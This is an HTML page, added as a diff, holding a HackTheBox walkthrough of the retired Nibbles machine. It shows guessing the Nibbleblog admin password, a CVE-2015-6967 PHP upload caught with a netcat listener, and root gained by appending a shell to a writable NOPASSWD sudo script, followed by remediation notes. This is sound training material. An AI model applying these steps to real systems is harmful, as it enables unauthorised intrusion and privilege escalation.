@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Nibbles: Nibbleblog upload RCE and a sudo script to root — Lucky Thandel</title>
+<meta name="description" content="Guessed admin creds, a plugin upload that takes PHP (CVE-2015-6967), then a NOPASSWD monitor.sh that hands over root. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-05 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Nibbles: Nibbleblog upload RCE and a sudo script to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Nibbles is a retired HackTheBox easy Linux machine built around Nibbleblog, a tiny CMS. Synopsis: guessed admin creds, a plugin upload that takes PHP (CVE-2015-6967), then a NOPASSWD monitor.sh that hands over root.</p>
+<h2><span class="amber">$</span> Enumeration — CMS plus defaults</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: find the blog, try defaults</span>
+nmap -sC -sV 10.10.10.75
+gobuster dir -u http://10.10.10.75 -w common.txt   # -&gt; /nibbleblog/
+# admin login: admin:nibbles</pre>
+<p>Apache plus SSH, and gobuster finds /nibbleblog/. The admin login falls to the classic weak credential admin:nibbles. Default CMS creds are still a foothold in the wild.</p>
+<h2><span class="amber">$</span> Foothold — CVE-2015-6967 plugin upload</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: catch the plugin shell</span>
+# logged in as admin -&gt; Plugins -&gt; My image -&gt; upload shell.php disguised as image
+# browse to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
+nc -lvnp 4444</pre>
+<p>Nibbleblog 4.0.3 lets an authenticated admin upload plugin files, and the my_image plugin accepts PHP disguised as an image. Browse to the uploaded file and catch the callback as the nibbler web user.</p>
+<h2><span class="amber">$</span> Privilege escalation — writable NOPASSWD script</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: poison monitor.sh, sudo it</span>
+sudo -l   # (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+ls -l ~/personal/stuff/monitor.sh   # writable!
+echo &quot;/bin/bash&quot; &gt;&gt; ~/personal/stuff/monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh
+id   # uid=0(root)</pre>
+<p>The script itself is writable — append a shell payload and run it with sudo. NOPASSWD on a modifiable script is root by delegation. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Fuzzing for exotic RCE before trying the login (the creds are the intended door) and uploading a raw .php file (follow the plugin upload flow exactly).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Patch or replace end-of-life CMS software, enforce strong unique admin passwords, and never grant NOPASSWD sudo on scripts non-root users can modify. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
